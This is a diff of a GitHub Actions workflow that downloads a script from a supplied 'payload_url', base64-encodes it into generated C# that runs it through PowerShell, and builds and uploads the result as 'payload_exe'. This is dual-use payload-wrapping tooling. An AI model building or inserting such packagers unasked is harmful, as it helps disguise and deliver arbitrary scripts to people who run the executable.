@@ -1,4 +1,4 @@
-name: Build PowerShell EXE using C# method
+name: Build PowerShell EXE using .NET
 
 on:
   workflow_dispatch:
@@ -16,6 +16,10 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
+    - name: Install .NET SDK
+      run: |
+        dotnet --version
+
     - name: Fetch Payload from URL
       run: |
         $url = '${{ github.event.inputs.payload_url }}'
@@ -27,6 +31,12 @@ jobs:
         $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script))
         Set-Content -Path 'base64_payload.txt' -Value $b64
 
+    - name: Create .NET console project
+      run: |
+        dotnet new console -o PowerShellRunner
+        cd PowerShellRunner
+        dotnet add package Microsoft.PowerShell.SDK
+
     - name: Generate C# code
       shell: powershell
       run: |
@@ -35,27 +45,29 @@ jobs:
         using System;
         using System.Management.Automation;
         using System.Text;
-
+        
         class Program {
-        static void Main() {
-        string b64 = ""{B64_PLACEHOLDER}"";
-        string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-        using (PowerShell ps = PowerShell.Create()) {
-            ps.AddScript(script);
-            ps.Invoke();
-        }
-        }
+            static void Main() {
+                string b64 = ""{B64_PLACEHOLDER}"";
+                string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+                using (PowerShell ps = PowerShell.Create()) {
+                    ps.AddScript(script);
+                    ps.Invoke();
+                }
+            }
         }
         "@ -replace "{B64_PLACEHOLDER}", $b64
 
-        Set-Content -Path 'Program.cs' -Value $csharp_code
+        Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
 
-    - name: Compile C# code into EXE
+    - name: Build EXE
       run: |
-        & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs
+        cd PowerShellRunner
+        dotnet build -c Release
 
     - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: payload.exe
+        path: PowerShellRunner/bin/Release/net8.0/PowerShellRunner.exe
+
